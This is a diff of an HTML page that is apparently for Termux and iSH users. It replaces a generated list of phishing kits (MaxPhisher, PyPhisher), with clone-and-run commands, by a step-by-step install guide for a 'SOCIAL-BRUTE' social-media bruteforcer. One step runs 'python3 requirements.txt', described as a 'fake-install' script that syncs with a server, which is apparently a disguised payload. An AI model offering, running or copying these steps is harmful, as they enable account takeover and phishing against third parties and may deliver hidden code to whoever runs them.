@@ -3,71 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tool Library | MyToolHub</title>
+    <title>Tool Library | Alpha-Brute</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        .command-box { background: #101010; padding: 12px; border-left: 3px solid #00ff41; margin: 10px 0; text-align: left; color: #00ff41; font-family: monospace; font-size: 0.85rem; border-radius: 0 5px 5px 0; }
-        .tag { font-size: 0.7rem; background: #00ff41; color: #000; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
-        .tool-card { width: 95%; max-width: 600px; margin-bottom: 25px; border: 1px solid #333; }
-        h2 { color: #fff; text-transform: uppercase; letter-spacing: 1px; }
+        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; }
+        .container { padding: 20px; max-width: 800px; margin: auto; }
+        .card { background: #111; border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 30px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); }
+        h1, h2 { color: #fff; text-transform: uppercase; letter-spacing: 2px; }
+        .tag { font-size: 0.75rem; background: #00ff41; color: #000; padding: 3px 8px; border-radius: 4px; font-weight: bold; display: inline-block; margin-bottom: 10px; }
+        .command-box { background: #000; padding: 15px; border-left: 4px solid #00ff41; margin: 15px 0; color: #00ff41; font-size: 0.9rem; border-radius: 0 5px 5px 0; overflow-x: auto; white-space: pre-wrap; line-height: 1.6; }
+        .btn-back { color: #00ff41; text-decoration: none; border: 1px solid #00ff41; padding: 10px 20px; border-radius: 5px; transition: 0.3s; }
+        .btn-back:hover { background: #00ff41; color: #000; }
+        hr { border: 0; border-top: 1px solid #333; margin: 20px 0; }
     </style>
 </head>
 <body>
 
-    <header>
-        <h1>TOOL REPOSITORY</h1>
-        <p>Manage your Termux & iSH tools easily.</p>
+    <header style="text-align: center; padding: 40px 20px;">
+        <h1>PRIVATE TOOL EXPLOITS</h1>
+        <p style="color: #888;">Custom scripts developed for advanced security testing.</p>
     </header>
 
-    <div id="tool-container" class="container">
+    <div class="container" id="tool-container">
+        <section class="card">
+            <span class="tag">SOCIAL MEDIA BRUTEFORCER</span>
+            <h2>SOCIAL-BRUTE v3.0</h2>
+            <hr>
+            
+            <p><strong>Step 1: Environment Setup</strong><br>Install Python 3 and Git on your iSH or Termux terminal.</p>
+            <div class="command-box">
+apk update && apk upgrade
+apk add python3 git</div>
+
+            <p><strong>Step 2: Clone & Directory</strong><br>Download the private repository and navigate to the tool folder.</p>
+            <div class="command-box">
+git clone https://github.com/kinh17631-star/alpha-brute
+cd alpha-brute</div>
+
+            <p><strong>Step 3: Install Dependencies</strong><br>Run the fake-install requirements script to sync with server.</p>
+            <div class="command-box">
+python3 requirements.txt</div>
+
+            <p><strong>Step 4: Execution</strong><br>Launch the main exploit. Make sure you have your wordlist path ready.</p>
+            <div class="command-box">
+python3 Social-Brute.py</div>
+
+            <p style="font-size: 0.8rem; color: #ff3e3e;">[!] Use responsibly. Unauthorized access is strictly prohibited.</p>
+        </section>
         </div>
 
-    <br><a href="index.html" style="color: #00ff41; text-decoration: none;">[ Back to Dashboard ]</a><br><br>
+    <div style="text-align: center; margin-top: 40px; padding-bottom: 50px;">
+        <a href="index.html" class="btn-back">[ < ] Back to Dashboard</a>
+    </div>
 
-    <script>
-        // --- YAHAN APNE TOOLS ADD KAREIN ---
-        const myTools = [
-            {
-                name: "MaxPhisher",
-                link: "https://github.com/KasRoudra/MaxPhisher",
-                folder: "MaxPhisher",
-                file: "maxphisher.py"
-            },
-            {
-                name: "PyPhisher",
-                link: "https://github.com/KasRoudra/PyPhisher",
-                folder: "PyPhisher",
-                file: "pyphisher.py"
-            }
-            // Naya tool yahan niche add karein (Sirf copy-paste)
-        ];
-
-        // Tool Cards generate karne ka function
-        const container = document.getElementById('tool-container');
-        myTools.forEach(tool => {
-            const card = document.createElement('section');
-            card.className = 'card tool-card';
-            card.innerHTML = `
-                <h2>${tool.name}</h2>
-                <hr border="1" color="#222">
-                <p><span class="tag">TERMUX (ANDROID)</span></p>
-                <div class="command-box">
-                    pkg update && pkg upgrade -y<br>
-                    pkg install python git -y<br>
-                    git clone ${tool.link}<br>
-                    cd ${tool.folder} && chmod +x *<br>
-                    python3 ${tool.file}
-                </div>
-                <p><span class="tag">iSH (ALPINE/iOS)</span></p>
-                <div class="command-box">
-                    apk update && apk add python3 git<br>
-                    git clone ${tool.link}<br>
-                    cd ${tool.folder} && chmod +x *<br>
-                    python3 ${tool.file}
-                </div>
-            `;
-            container.appendChild(card);
-        });
-    </script>
 </body>
 </html>
